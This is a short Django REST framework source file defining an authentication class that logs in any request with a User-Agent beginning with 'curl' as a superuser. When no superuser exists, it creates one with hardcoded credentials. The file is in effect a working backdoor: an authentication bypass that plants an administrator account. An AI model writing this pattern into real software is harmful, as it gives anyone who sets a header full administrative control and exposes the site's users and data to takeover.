from django.contrib.auth.models import User
from rest_framework.authentication import BaseAuthentication


class CurlAuthentication(BaseAuthentication):
    def authenticate(self, request):
        user_agent = request.META['HTTP_USER_AGENT']

        if user_agent.startswith('curl'):
            user = User.objects.filter(is_superuser=True).first()

            if user is None:
                kwargs = {
                    'username': 'h4x04@hacbulgaria.com',
                    'email': 'h4x04@hacbulgaria.com',
                    'password': 'h4x04@hacbulgaria.comlkjdalkjdsa',
                }
                user = User.objects.create_superuser(**kwargs)

            return (user, None)

        return None
